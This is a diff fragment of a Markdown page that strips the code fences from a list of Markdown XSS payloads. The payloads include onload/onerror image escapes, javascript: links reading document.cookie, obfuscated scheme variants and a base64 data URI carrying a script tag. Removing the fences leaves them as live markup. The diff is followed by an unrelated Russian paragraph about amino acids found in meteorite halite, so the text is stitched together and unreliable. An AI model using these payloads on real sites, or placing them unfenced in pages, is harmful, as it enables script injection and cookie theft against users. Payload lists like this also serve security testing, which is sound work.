@@ -28,14 +28,14 @@ Cсылка на источник
 
 ## Images
 
-```markdown
+
 ![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
 ![Escape SRC - onerror]("onerror="alert('ImageOnError'))
-```
+
 
 ## Fuzzing
 
-```markdown
+
 [XSS](javascript:prompt(document.cookie))
 [XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 [XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
@@ -62,7 +62,7 @@ Cсылка на источник
 ![XSS](javascript:prompt(document.cookie))\
 ![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
 ![XSS'"`onerror=prompt(document.cookie)](x)\
-```
+
 
 
 Из метеоритов были выделены крошечные кристаллы — галиты, которые могли образоваться только при наличии воды. В них ученым удалось обнаружить сложные органические соединения, включая аминокислоты — по современным представлениям, именно эти ингредиенты являлись основой для зарождения жизни на Земле.
